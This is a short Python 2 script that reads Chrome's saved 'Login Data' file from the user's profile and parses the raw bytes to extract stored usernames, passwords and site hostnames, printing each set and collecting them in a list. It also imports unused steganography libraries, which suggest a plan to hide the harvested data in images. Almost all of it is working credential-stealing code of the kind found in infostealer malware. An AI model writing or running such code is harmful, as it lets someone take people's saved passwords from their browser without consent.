import glob
from os import path, geteuid,system
import stepic
import Image
from datetime import datetime, timedelta
import sys
from time import sleep
import re

#def decrypt_passwords():
chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
print chrome_path 
#try:
f = open(chrome_path,'r')
lines = []
s=""
while True:
	c = f.read(1)
	if not c:
	  break
	elif c>=' ' and c<='~':	
		s=s+c
		#print c,
	elif  c=='\n':
		lines.append(s)
		s=""
		
f.close()
r = re.compile('/')
l1 = r.split(lines[1])
l2 = r.split(lines[2])
i=1

x = []
while(5+(i-1)*9 < l1.__len__()):
	x.append(l1[5+(i-1)*9])			#Hostname
	x.append(l1[6+(i-1)*9])
	i=i+1

y = []
i=1
while(3+(i-1)*6 < l2.__len__()):
	y.append(l2[3+(i-1)*6])
	i=i+1

i=1
savedlist = []
while(2*(i-1) < x.__len__()):
	hostname = x[2*(i-1)]
	s1 = x[2*(i-1) + 1]
	s2 = y[i-1]
	for j in range(0,1000):
		if s1[j:j+5].lower() == 'email':
			break
	s1 = s1[j:]
	for j in range(0,1000):
		if s2[j:j+5].lower() == 'email':
			break
	s2 = s2[j:]
	for j in range (0,1000):
		if(s2[j] != s1[j]):
			break
	s3 = s1[j:]
	s4 = s2[j:]
	password = s3[:-len(s4)]
	s2 = s2[:-len(s4)]
	s2 = s2[5:]
	j = len(s2)
	while (j>=0):
		j = j - 1
		if(s2[j].lower()=='p'):
			break
	username =  s2[:j]
	print [username,password,hostname]
	savedlist.append([username,password,hostname])
	i=i+1

#except:
#	print "error"
		
#lines = decrypt_passwords()
